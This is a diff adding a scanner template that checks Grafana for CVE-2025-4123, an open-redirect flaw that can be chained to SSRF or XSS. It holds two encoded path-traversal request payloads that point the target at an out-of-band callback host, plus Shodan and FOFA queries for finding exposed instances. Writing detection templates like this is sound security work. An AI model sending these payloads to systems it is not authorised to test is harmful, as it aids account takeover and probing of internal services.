@@ -1,0 +1,39 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code == 302 && contains(location, '/\\oast.pro/?/../../')
+          name: open-redirect
+          type: dsl
+        - dsl:
+            - contains(interactsh_protocol, 'dns') && contains(content_type, 'image/png')
+          name: ssrf
+          type: dsl
+      raw:
+        - |
+          GET /render/public/..%252f%255C{{interactsh-url}}%252f%253F%252f..%252f.. HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /public/..%2F%5coast.pro%2F%3f%2F..%2F.. HTTP/1.1
+          Host: {{Hostname}}
+id: Grafana-Xss-SSrf-CVE-2025-4123
+info:
+    author: PokerSec
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N
+        cvss-score: 7.6
+    description: |
+        An open redirect vulnerability in Grafana can be chained with other issues, such as XSS or SSRF, to increase impact. An attacker may exploit the redirect to target internal services or deliver malicious JavaScript, potentially leading to internal data exposure or account takeover.
+    metadata:
+        fofa-query: app="Grafana"
+        max-request: 1
+        shodan-query: product:"Grafana"
+        verified: true
+    name: Grafana-Xss-SSrf-CVE-2025-4123
+    reference:
+        - https://medium.com/@Nightbloodz/grafana-cve-2025-4123-full-read-ssrf-account-takeover-d12abd13cd53
+        - https://grafana.com/blog/2025/05/21/grafana-security-release-high-severity-security-fix-for-cve-2025-4123/
+    severity: high
+    tags:
+        - grafana
+        - unauth
+        - oss
